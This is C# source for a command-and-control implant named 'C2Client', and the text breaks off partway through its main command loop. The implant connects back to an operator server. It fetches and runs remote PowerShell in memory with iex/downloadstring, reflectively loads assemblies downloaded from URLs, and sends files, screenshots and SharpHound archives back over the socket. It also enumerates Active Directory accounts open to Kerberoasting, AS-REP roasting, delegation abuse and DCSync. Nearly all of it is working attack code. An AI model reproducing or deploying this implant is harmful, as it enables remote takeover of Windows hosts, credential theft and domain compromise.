using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
//using System.Runtime.InteropServies;
using System.DirectoryServices.AccountManagement;
using System.Collections;
using System.Security.Principal;
using System.Security.AccessControl;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace C2Client
{
    class Program
    {
        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            TokenIsAppContainer,
            TokenCapabilities,
            TokenAppContainerSid,
            TokenAppContainerNumber,
            TokenUserClaimAttributes,
            TokenDeviceClaimAttributes,
            TokenRestrictedUserClaimAttributes,
            TokenRestrictedDeviceClaimAttributes,
            TokenDeviceGroups,
            TokenRestrictedDeviceGroups,
            TokenSecurityAttributes,
            TokenIsRestricted,
            TokenProcessTrustLevel,
            TokenPrivateNameSpace,
            TokenSingletonAttributes,
            TokenBnoIsolation,
            TokenChildProcessFlags,
            TokenIsLessPrivilegedAppContainer,
            TokenIsSandboxed,
            MaxTokenInfoClass
        }


        [DllImport("Advapi32.dll")]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            UInt32 DesiredAccess,
            ref IntPtr TokenHandle
            );

        [DllImport("Advapi32.dll")]
        public static extern bool GetTokenInformation(
            IntPtr tokenhandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            ref int ReturnLength
            );
        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_ELEVATION
        {
            public UInt32 TokenIsElevated;
        }

        [DllImport("Kernel32.dll")]
        public static extern bool CloseHandle(IntPtr handle);


        [DllImport("Kernel32.dll")]
        public static extern bool IsDebuggerPresent();

        public string GetResult(string cmd)
        {
            string result;
            try
            {


                RunspaceConfiguration rc = RunspaceConfiguration.Create();
                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = r;
                ps.AddScript(cmd);

                Collection<PSObject> po = ps.Invoke();


                StringWriter sw = new StringWriter();

                foreach (PSObject p in po)
                {
                    sw.WriteLine(p.ToString());
                }

                result = sw.ToString();

            }
            catch (Exception e)
            {
                result = e.Message;
            }
            Console.WriteLine("Result {0}", result);
            return result;


        }

        public string UploadToServer(Socket cs, string filename)
        {
            lock (this)
            {
                string result;

                byte[] b = File.ReadAllBytes(filename);
                result = Convert.ToBase64String(b);
                return result;
            }
        }


        public string DownloadFromServer(Socket c, string filename, string dest, int file_size)
        {
            lock (this)
            {
                string result;
                try
                {
                    byte[] contents = new byte[file_size];
                    Array.Clear(contents, 0, contents.Length);
                    c.Receive(contents);
                    string file2 = Path.GetFileName(filename);
                    Console.WriteLine(file2);
                    FileStream fs = File.Open(dest, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                    fs.Write(contents, 0, contents.Length);
                    fs.Close();
                    result = "got file";
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
                return result;
            }

        }

        public string GetSharpHoundZip(Socket c, string url)
        {
            string result;
            try
            {
                string cmd = String.Format(@"iex(new-object net.webclient).downloadstring('{0}')", url);
                Console.WriteLine(cmd);

                RunspaceConfiguration rc = RunspaceConfiguration.Create();
                Runspace r = RunspaceFactory.CreateRunspace(rc);
                r.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = r;
                ps.AddScript(cmd);


                Collection<PSObject> po = ps.Invoke();



                StringWriter sw = new StringWriter();

                foreach (PSObject p in po)
                {
                    sw.WriteLine(p.ToString());
                }
                ps.Stop();
                r.Close();
                //Thread.Sleep(5000);
                result = sw.ToString();
                Console.WriteLine("Result is " + result);

                var files = Directory.EnumerateFiles(@"C:\Users\blairej.THROWBACK\Desktop", "pwn*temp.zip");
                
                foreach (string f in files)
                {
                    Console.WriteLine(f);

                    
                    //Thread.Sleep(5000);
                    //File.WriteAllBytes(@"C:\Windows\Temp\test.zip", b);
                    //string b64 =Convert.ToBase64String(b);
                    c.Send(File.ReadAllBytes(f));
                   Console.WriteLine(File.ReadAllBytes(f).Length);
                    // Thread.Sleep(2000);
                    //File.Delete(f);

                }

            }
            catch (Exception e)
            {
                result = e.Message;
            }

            return result;


        }

        public string GetASREPRoastable(Socket c)
        {
            // User access control values
            List<string> l = new List<string>();
            l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
            l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
            l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
            l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
            l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
            l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
            l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
            l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
            l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
            l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");
            //l.Reverse();
            string result = "";
            try
            {
                Forest f = Forest.GetCurrentForest();
                DomainCollection domains = f.Domains;
                foreach (Domain d in domains)
                {
                    string domainName = d.Name.ToString();
                    string[] dcs = domainName.Split('.');
                    for (int i = 0; i < dcs.Length; i++)
                    {
                        dcs[i] = "DC=" + dcs[i];

                    }

                    StringWriter sw = new StringWriter();
                    try
                    {
                        // DC=tech69,DC=local,DC=net 
                        DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                        DirectorySearcher ds = new DirectorySearcher();
                        ds.SearchRoot = de;
                        ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";
                        foreach (SearchResult sr in ds.FindAll())
                        {
                            sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
                            sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
                            int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                            string uac_binary = Convert.ToString(uac, 2);
                            List<string> flags = new List<string>();
                            //Console.WriteLine(l.Count);
                            //Console.WriteLine(uac_binary.Length);
                            for (int i = 0; i < uac_binary.Length; i++)
                            {
                                int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                                if (result2 != 0)
                                {
                                    //Console.WriteLine(l[i]);
                                    flags.Add(l[i]);
                                }

                            }
                            foreach (string temp in flags)
                            {
                                sw.WriteLine(temp);
                            }
                            sw.WriteLine();

                        }

                        result += sw.ToString();
                    }
                    catch { }
                }
                Console.WriteLine("Result is-->{0}<--", result);
                if (result == "")
                {
                    result = "No accounts found";
                }
            }

            catch (Exception e)
            {
                result = e.Message;
            }

            return result;
        }

        public string GetKerberoastable()
        {
            string result ="";
            try
            {

                Forest f = Forest.GetCurrentForest();
                DomainCollection domains = f.Domains;
                foreach (Domain d in domains)
                {
                    string domainName = d.Name.ToString();
                    string[] dcs = domainName.Split('.');
                    for (int i = 0; i < dcs.Length; i++)
                    {
                        dcs[i] = "DC=" + dcs[i];

                    }

                    StringWriter sw = new StringWriter();

                    try
                    {
                        // DC=tech69,DC=local,DC=net 
                        DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                        DirectorySearcher ds = new DirectorySearcher();
                        ds.SearchRoot = de;
                        ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";

                        foreach (SearchResult sr in ds.FindAll())
                        {
                            sw.WriteLine("Sam Account Name: {0}", sr.Properties["samaccountname"][0]);
                            sw.WriteLine("Service Principal Name: {0}", sr.Properties["serviceprincipalname"][0]);
                            sw.WriteLine();
                        }

                        result += sw.ToString();
                    }
                    catch { }
                }
                if (result == "")
                {
                    result = "No Accounts found";
                }
            }
            catch (Exception e)
            {
                result = e.Message;
            }

            return result;

        }

        public string RunPSScript(string url)
        {
            string result = "";
            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rc);
            r.Open();

            string cmd = String.Format(@"iex(new-object net.webclient).downloadstring('{0}')", url) ;
            StringWriter sw = new StringWriter();

            PowerShell ps =PowerShell.Create();
            ps.Runspace = r;
            ps.AddScript(cmd);
            Console.WriteLine(cmd);
            Collection<PSObject> po = ps.Invoke();

            //Thread.Sleep(3000);

            foreach(PSObject p in po)
            {
                sw.WriteLine(p.ToString());
            }
            ps.Stop();
            r.Close();
            // Thread.Sleep(4000);
            sw.WriteLine("Executed successfully");
            result += sw.ToString();
            
            Console.WriteLine("---------------result-------");
            Console.WriteLine(result);
            return result;

        }
        public StringWriter GetAllMembers(string groupName, string domainName,StringWriter sw)
        {
            
            PrincipalContext p = new PrincipalContext(ContextType.Domain, domainName);
            GroupPrincipal gp = GroupPrincipal.FindByIdentity(p, groupName);
            foreach (Principal group in gp.GetMembers())
            {
                if (group.StructuralObjectClass == "user")
                {
                    sw.WriteLine("User: {0} is memberOf {1}", group.Name, groupName);
                }
                if (group.StructuralObjectClass == "group")
                {
                    sw.WriteLine("Group: {0} is memberOf {1}", group.Name, groupName);
                    (new Program()).GetAllMembers(group.Name, domainName,sw);
                }
            }
            return sw;
        }

        public string GetDCSyncUsers(string domainDN)
        {
            string result="";
            Console.WriteLine(domainDN);
            StringWriter sw = new StringWriter();
            sw.WriteLine("-------- DOMAIN: {0} ---------", domainDN);
            Hashtable ht = new Hashtable();
            ht.Add("DS-Replication-Get-Changes", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-All", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-In-Filtered-Set", "89e95b76-444d-4c62-991a-0facbeda640c");
            ht.Add("DS-Replication-Manage-Topology", "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
            ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");

            try
            {
                DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                
                foreach (SearchResult sr in ds.FindAll())
                {
                    try
                    {
                        DirectoryEntry temp = sr.GetDirectoryEntry();
                        AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));

                        foreach (ActiveDirectoryAccessRule a in arc)
                        {
                            if (domainDN.Contains(temp.Name.ToString()))
                            {

                                foreach (DictionaryEntry d in ht)
                                {
                                    
                                    if (d.Value.ToString() == a.ObjectType.ToString())
                                    {
                                        sw.WriteLine(a.IdentityReference);
                                        sw.WriteLine(d.Key.ToString());
                                        sw.WriteLine(a.ObjectType);
                                        //sw.WriteLine(a.AccessControlType);
                                        //sw.WriteLine(a.ActiveDirectoryRights);

                                        sw.WriteLine();
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
                result = sw.ToString();
                return result;
            }
            catch { }
            return result;
        }

        public string GetDirectoryContents(string dirName)
        {
            string result="";
            StringWriter sw = new StringWriter();
            string cwd = Directory.GetCurrentDirectory();
            //dirName = "..";
            try
            {
                var contents = Directory.EnumerateFileSystemEntries(dirName);
                Console.WriteLine(dirName);
                //Console.WriteLine(Path.GetFullPath(dirName));
                sw.WriteLine(Path.GetFullPath(dirName));
                foreach (var file in contents)
                {
                    if (File.Exists(file))
                    {
                        //Console.WriteLine(Path.GetFileName(file));
                        sw.WriteLine("F->" + Path.GetFileName(file));
                    }
                    else
                    {
                        sw.WriteLine("D->"+ Path.GetFileName(file));
                    }
                    
                }
                result = sw.ToString();
            }

            catch(Exception e) 
            {
                result = Path.GetFullPath(dirName)+"\n";
                result += e.Message;
            }
            
            return result;
        }

        public string UploadNFiles(Socket c,int nooffiles,string cwd)
        {
            string result;
            try
            {
                for (int i = 0; i < nooffiles; i++)
                {
                    // receiving file name
                    byte[] filename = new byte[1024];
                    Array.Clear(filename, 0, filename.Length);
                    c.Receive(filename);

                    // sending file contents
                    Console.WriteLine(cwd);
                    string fd = cwd + "\\"+ Encoding.ASCII.GetString(filename).TrimEnd('\0');
                    Console.WriteLine(fd);
                    byte[] contents = new byte[10240000];
                    Array.Clear(contents, 0, contents.Length);
                    contents = File.ReadAllBytes(@fd);
                    c.Send(contents);
                    Thread.Sleep(1000);
                }
                result = "Files Downloaded successfully";
                return result;
            }
            catch(Exception e)
            {
                result = e.Message;
            }
            return result;
        }

        public string GetSoftware(string RegistryKeyValue)
        {
            string result;
            StringWriter sw = new StringWriter();

            RegistryKey rkey = Registry.LocalMachine.OpenSubKey(RegistryKeyValue);

            string[] subkeys = rkey.GetSubKeyNames();

            foreach (string subkey in subkeys)
            {
                string nextkey = RegistryKeyValue + @"\" + subkey;
                RegistryKey childkey = Registry.LocalMachine.OpenSubKey(nextkey);


                sw.WriteLine("{0} -------- {1}", childkey.GetValue("DisplayName"), childkey.GetValue("DisplayVersion"));


            }
            result = sw.ToString();
            return result;
        }

        public string GetRegSubKeysandValues(string RegKey)
        {
            string result;
            StringWriter sw = new StringWriter();

            if (RegKey.Contains("HKCR"))
            {
                RegistryKey hkcr = Registry.ClassesRoot;
                string[] subkeys;
                if (RegKey == "HKCR")
                {

                    subkeys = hkcr.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    result = sw.ToString();
                    return result;
                }
                else
                {
                   string childkeyname= RegKey.ToString().Remove(0, 5);
                   RegistryKey childkey= hkcr.OpenSubKey(childkeyname);
                    subkeys = childkey.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    sw.WriteLine("-----------Values----------");
                    string[] valuenames = childkey.GetValueNames();
                    foreach (string value in valuenames)
                    {
                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
                    }


                    if (subkeys.Length == 0)
                    {
                        string[] values = childkey.GetValueNames();
                        foreach (string valuename in values)
                        {
                            string value = childkey.GetValue(valuename).ToString();
                            sw.WriteLine("{0} -------> {1}", valuename, value);
                        }
                        result = sw.ToString();
                        return result;
                    }
                    
                }
                
                
            }


            else if (RegKey.Contains("HKCU"))
            {

                RegistryKey hkcu = Registry.CurrentUser;
                string[] subkeys;
                if (RegKey == "HKCU")
                {

                    subkeys = hkcu.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    result = sw.ToString();
                    return result;

                }
                else
                {
                    string childkeyname = RegKey.ToString().Remove(0, 5);
                    RegistryKey childkey = hkcu.OpenSubKey(childkeyname);
                    subkeys = childkey.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }

                    sw.WriteLine("-----------Values----------");
                    string[] valuenames = childkey.GetValueNames();
                    foreach(string value in valuenames)
                    {
                        sw.WriteLine("{0} ------> {1}",value,childkey.GetValue(value).ToString());
                    }

                    if (subkeys.Length == 0)
                    {
                        string[] values = childkey.GetValueNames();
                        foreach (string valuename in values)
                        {
                            string value = childkey.GetValue(valuename).ToString();
                            sw.WriteLine("{0} -------> {1}", valuename, value);
                        }
                        result = sw.ToString();
                        return result;
                    }
                    
                }
                
                /*sw.WriteLine("---------Values--------");
                string childkeyname2 = RegKey.ToString().Remove(0, 5);
                RegistryKey childkey2 = hkcu.OpenSubKey(childkeyname2);
                string[] valuenames =childkey2.GetValueNames();
                foreach(string value in valuenames)
                {
                    sw.WriteLine(value);
                }*/

                result = sw.ToString();
                return result;
            }

            else if (RegKey.Contains("HKLM"))
            {

                RegistryKey hklm = Registry.LocalMachine;
                string[] subkeys;
                if (RegKey == "HKLM")
                {

                    subkeys = hklm.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    result = sw.ToString();
                    return result;
                }
                else
                {
                    string childkeyname = RegKey.ToString().Remove(0, 5);
                    Console.WriteLine("childkey {0}",childkeyname);
                    RegistryKey childkey = hklm.OpenSubKey(childkeyname);
                    subkeys = childkey.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }

                    sw.WriteLine("-----------Values----------");
                    string[] valuenames = childkey.GetValueNames();
                    foreach (string value in valuenames)
                    {
                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
                    }




                    if (subkeys.Length == 0)
                    {
                        string[] values = childkey.GetValueNames();
                        foreach (string valuename in values)
                        {
                            string value = childkey.GetValue(valuename).ToString();
                            sw.WriteLine("{0} -------> {1}", valuename, value);
                        }
                        result = sw.ToString();
                        return result;
                    }
                    
                }
                
                
            }

            else if (RegKey.Contains("HKUSERS"))
            {

                RegistryKey hkusers = Registry.Users;
                string[] subkeys;
                if (RegKey == "HKUSERS")
                {

                    subkeys = hkusers.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    result = sw.ToString();
                    return result;
                }
                else
                {
                    string childkeyname = RegKey.ToString().Remove(0, 8);
                    RegistryKey childkey = hkusers.OpenSubKey(childkeyname);
                    subkeys = childkey.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }

                    sw.WriteLine("-----------Values----------");
                    string[] valuenames = childkey.GetValueNames();
                    foreach (string value in valuenames)
                    {
                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
                    }

                    if (subkeys.Length == 0)
                    {
                        string[] values = childkey.GetValueNames();
                        foreach(string valuename in values)
                        {
                           string value= childkey.GetValue(valuename).ToString();
                            sw.WriteLine("{0} -------> {1}", valuename, value);
                        }
                        result = sw.ToString();
                        return result;
                    }
                    
                }
                
                
            }

            else if (RegKey.Contains("HKCURRENT_CONFIG"))
            {

                RegistryKey hkcconfig = Registry.CurrentConfig;
                string[] subkeys;
                if (RegKey == "HKCURRENT_CONFIG")
                {

                    subkeys = hkcconfig.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }
                    result = sw.ToString();
                    return result;

                }
                else
                {
                    string childkeyname = RegKey.ToString().Remove(0, 17);
                    RegistryKey childkey = hkcconfig.OpenSubKey(childkeyname);
                    subkeys = childkey.GetSubKeyNames();
                    foreach (string subkey in subkeys)
                    {
                        sw.WriteLine(subkey);
                    }

                    sw.WriteLine("-----------Values----------");
                    string[] valuenames = childkey.GetValueNames();
                    foreach (string value in valuenames)
                    {
                        sw.WriteLine("{0} ------> {1}", value, childkey.GetValue(value).ToString());
                    }

                    if (subkeys.Length == 0)
                    {
                        string[] values = childkey.GetValueNames();
                        foreach (string valuename in values)
                        {
                            string value = childkey.GetValue(valuename).ToString();
                            sw.WriteLine("{0} -------> {1}", valuename, value);
                        }
                        result = sw.ToString();
                        return result;
                    }
                    
                }
                
                
            }

            result = sw.ToString();
            return result;
        }

        public void ReflectionLoadFile(byte[] toload)
        {
            try
            {
                Assembly assembly = Assembly.Load(toload);
                string[] newargs = { };
                assembly.EntryPoint.Invoke(null, new object[] { newargs });

            }
            catch { }
            
        }

        public void ReflectionLoadUrl(string url)
        {
            try
            {
                WebClient wc = new WebClient();
                byte[] filecontent = wc.DownloadData(url);
                Assembly assembly = Assembly.Load(filecontent);
                string[] newargs = { };
                assembly.EntryPoint.Invoke(null, new object[] { newargs });
            }
            catch { }
        }


        public string GetUnconstrainedDelegation(string domainname)
        {
            string res = "";

            StringWriter sw = new StringWriter();
            try
            {

                List<string> l = new List<string>();
                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");

                
                string DomainName = domainname;
                // testing.tech69.local
                string[] domain = DomainName.Split('.');
                for (int i = 0; i < domain.Length; i++)
                {
                    domain[i] = "DC=" + domain[i];
                }
                string dn = String.Join(",", domain);

                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(useraccountcontrol>=524288))";

                foreach (SearchResult sr in ds.FindAll())
                {
                    //Console.WriteLine(sr.Properties["samaccountname"][0]);
                    // sw.WriteLine(sr.Properties["useraccountcontrol"][0]);
                    int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                    string uac_binary = Convert.ToString(uac, 2);
                    List<string> flags = new List<string>();
                    //Console.WriteLine(l.Count);
                    //Console.WriteLine(uac_binary.Length);
                    for (int i = 0; i < uac_binary.Length; i++)
                    {
                        int result2 = uac & Convert.ToInt32(Math.Pow(2, i));
                        if (result2 != 0)
                        {
                            //Console.WriteLine(l[i]);
                            flags.Add(l[i]);
                        }

                    }
                    foreach (string temp in flags)
                    {
                        if (temp.ToLower().Contains("deleg"))
                        {
                            sw.WriteLine("Name: {0}", sr.Properties["samaccountname"][0]);
                            foreach (string temp2 in flags)
                            {
                                sw.WriteLine(temp2);
                            }
                        }
                    }

                }
                res = sw.ToString();
            }
            catch(Exception e)
            {
                res = e.Message;
            }
                return res;
        }

        [DllImport("User32.dll")]
        private static extern int SetProcessDPIAware();
        public string GetScreenshot()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                SetProcessDPIAware();
            }

            SetProcessDPIAware();

            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                           Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Rectangle captureRectangle = Screen.PrimaryScreen.Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            //Console.WriteLine( captureRectangle.Size);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            ImageConverter ic = new ImageConverter();
            byte[] imagebytes = (byte[])ic.ConvertTo(captureBitmap, typeof(byte[]));

            string encodedimage= Convert.ToBase64String(imagebytes);
            //Console.WriteLine(encodedimage);
            return encodedimage;
        }



        public static string GetProcesses()
        {
            string res;
            StringWriter sw = new StringWriter();
            Process[] procs = Process.GetProcesses();

            foreach(Process p in procs)
            {
                sw.Write(p.ProcessName + ",");
                sw.Write(p.Id + ",");
                sw.WriteLine(p.MainWindowTitle);
            }

            res = sw.ToString();

            return res;
        }


        public static bool ProcessExist(string pname)
        {
            //processname,id,mainwindowtitle
            string name = pname.Split(',')[0];
            string id = pname.Split(',')[1];
            int id2 = Convert.ToInt32(id);
            Console.WriteLine(name);
            Console.WriteLine(id);
            Console.WriteLine(id2);
            Process[] procs = Process.GetProcesses();
            foreach(Process p in procs)
            {
                if(p.Id==id2 && name == p.ProcessName)
                {
                    return true;
                }
            }
            return false;

        }


        public static void Main(string[] args)
        {

            


            if (args.Length != 4)
            {
                Console.WriteLine("Usage: exe IP PORT PAYLOAD_SERVER_IP PORT");
                System.Environment.Exit(0);
            }

            try
            {

                /*args[0] = Dns.GetHostAddresses("tech69.pythonanywhere.com")[0].ToString();
                Console.WriteLine(args[0]);*/
                IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(args[0]), Convert.ToInt32(args[1]));

                //args[0] = Dns.GetHostAddresses("tech69.pythonanywhere.com")[0].ToString();
                
                Socket cs = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                cs.Connect(ipe);


                byte[] buffer = new byte[10240];
                string cmd;
                cmd = "Hello world";


                cs.Send(Encoding.ASCII.GetBytes(cmd));

                Array.Clear(buffer, 0, buffer.Length);
                cs.Receive(buffer);
                Console.WriteLine("Received {0}", Encoding.ASCII.GetString(buffer).TrimEnd('\0'));

                cmd = Encoding.ASCII.GetString(buffer).TrimEnd('\0');

                while (Encoding.ASCII.GetString(buffer).TrimEnd('\0') != "quit")
                {
                    cmd = Encoding.ASCII.GetString(buffer).TrimEnd('\0');

                    if (cmd.Split(' ')[0].ToLower() == "download")
                    {
                        // download filename
                        string filename = cmd.Split(' ')[1];
                        Program p = new Program();
                        Thread uploader = new Thread(() => { cmd = p.UploadToServer(cs, filename); });
                        uploader.Name = "Uploader to server";
                        uploader.Start();
                        uploader.Join();
                        // Thread.Sleep(5000);
                        /*
                        byte[] filecontents = File.ReadAllBytes(filename);
                        string base64contents = Convert.ToBase64String(filecontents);
                        cmd = base64contents;*/
                    }
                    else if (cmd.Split(' ')[0].ToLower() == "upload")
                    {
                        Console.WriteLine(cmd);
                        // upload filename destination filesize
                        string filename_to_download = cmd.Split(' ')[1];
                        string destinationfile = cmd.Split(' ')[2];
                        int filesize2 = Convert.ToInt32(cmd.Split(' ')[3]);

                        Program p = new Program();
                        Thread downloader = new Thread(() => { cmd = p.DownloadFromServer(cs, filename_to_download, destinationfile, filesize2); });
                        downloader.Name = "File Downloader";
                        downloader.Start();
                        downloader.Join();
                        //File.WriteAllBytes(@"C:\Windows\Temp\" + file2, contents);

                        // Thread.Sleep(3000);
                        cmd = "got file";

                    }
                    else if (cmd == "Get-SharpHoundZip")
                    {
                        // download sharphound.ps1, execute it and save output
                        // to zipfile, upload that zip file to server
                        // delete that zipfile 
                        // url to payload server hosting scripts
                        string payload = String.Format("http://{0}:{1}/sharphound.ps1", args[2], args[3]);

                        Program p = new Program();
                        Thread sharp = new Thread(() => { cmd = p.GetSharpHoundZip(cs, payload); });
                        sharp.Name = "Sharphoundzip";
                        sharp.Start();
                        sharp.Join();
                        Thread.Sleep(2000);

                    }
                    else if (cmd == "Get-ASREPRoastable")
                    {
                        Program p = new Program();
                        Thread asrep = new Thread(() => { cmd = p.GetASREPRoastable(cs); });
                        asrep.Name = "asreproastable";
                        asrep.Start();
                        asrep.Join();
                        Console.WriteLine(cmd);

                    }
                    else if (cmd == "Get-Kerberoastable")
                    {
                        Program p = new Program();
                        Thread kerberoast = new Thread(() => { cmd = p.GetKerberoastable(); });
                        kerberoast.Name = "Get-Kerberoastable";
                        kerberoast.Start();
                        kerberoast.Join();

                    }

                    else if (cmd == "Get-GroupRecursive")
                    {

                        Program p = new Program();
                        Forest f = Forest.GetCurrentForest();
                        DomainCollection domains = f.Domains;
                        StringWriter sw = new StringWriter();
                        foreach (Domain d in domains)
                        {
                            string domainName = d.Name.ToString();
                            string[] dcs = domainName.Split('.');
                            for (int i = 0; i < dcs.Length; i++)
                            {
                                dcs[i] = "DC=" + dcs[i];

                            }
                            try
                            {
                                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
                                DirectorySearcher ds = new DirectorySearcher();
                                ds.SearchRoot = de;
                                ds.Filter = "(objectclass=group)";

                                sw.WriteLine("-----Domain: {0}-----", domainName);
                                foreach (SearchResult sr in ds.FindAll())
                                {
                                    sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
                                    Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
                                    groups.Start();
                                    groups.Join();
                                    sw.WriteLine();
                                }
                            }
                            catch { }
                        }

                        //Thread groups = new Thread(() => { sw = p.GetAllMembers("Domain Admins", d.Name, sw); });
                        // groups.Name = "groups";

                        Thread.Sleep(2000);
                        cmd = sw.ToString();
                        Console.WriteLine(cmd);


                    }

                    else if (cmd.Contains("RUNPSSCRIPT-"))
                    {

                        string[] command = cmd.Split('-');
                        string filename = command[1];
                        //get powerupps1 and execute in memory
                        string url = String.Format("http://{0}:{1}/{2}", args[2], args[3],filename);
                        Program p = new Program();
                        Thread runpsscript = new Thread(() => { cmd = p.RunPSScript(url); });
                        //cmd = p.RunPSScript(url);
                        runpsscript.Start();
                        runpsscript.Join();

                        Thread.Sleep(1000);


                    }

                    else if (cmd == "Get-DCSyncUsers")
                    {

                        Forest f = Forest.GetCurrentForest();
